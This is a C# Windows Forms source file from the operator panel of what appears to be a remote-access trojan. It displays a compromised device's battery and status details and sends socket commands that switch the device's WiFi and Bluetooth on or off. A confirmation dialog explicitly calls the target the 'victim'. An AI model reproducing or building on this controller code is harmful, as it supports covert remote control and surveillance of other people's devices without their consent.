using System;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace SV
{
    public partial class Bilgiler : MetroFramework.Forms.MetroForm
    {
        Socket sck; public string ID = "";
        public Bilgiler(Socket socket, string aydi)
        {
            InitializeComponent();
            sck = socket; ID = aydi;
            button1.Click += button1_Click;
            button2.Click += button2_Click;
            button3.Click += button3_Click;
            button4.Click += button4_Click;
            button5.Click += button5_Click;
            metroTabControl1.SelectedIndex = 0;

        }
        public void bilgileriIsle(params string[] args)
        {
            textBox1.Text = string.Empty;
            progressBar1.Value = int.Parse(args[0].Replace("%", ""));
            label1.Text = "%" + args[0];
            label2.Text = args[1].Split('&')[0];
            label3.Text = args[1].Split('&')[1];
            label4.Text = args[2];
            label5.Text = args[3];
            label6.Text = args[4];
            label7.Text = args[5];
            label8.Text = args[6];
            string[] spl = args[7].Split('<');
            for (int i = 0; i < spl.Length; i++)
            {
                textBox1.Text += spl[i] + Environment.NewLine;
            }
        }
        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("SARJ", Encoding.UTF8.GetBytes("ECHO"));
                sck.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
            }
            catch (Exception) { }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("WIFI", Encoding.UTF8.GetBytes("true"));
                sck.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                button1.PerformClick();
            }
            catch (Exception) { }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Connection between you and victim could be lost. Are you sure?",
                "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                try
                {
                    byte[] senddata = Form1.MyDataPacker("WIFI", Encoding.UTF8.GetBytes("false"));
                    sck.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                    button1.PerformClick();
                }
                catch (Exception) { }                
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("BLUETOOTH", Encoding.UTF8.GetBytes("true"));
                sck.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                button1.PerformClick();
            }
            catch (Exception) { }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("BLUETOOTH", Encoding.UTF8.GetBytes("false"));
                sck.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                button1.PerformClick();
            }
            catch (Exception) { }
        }
    }
}
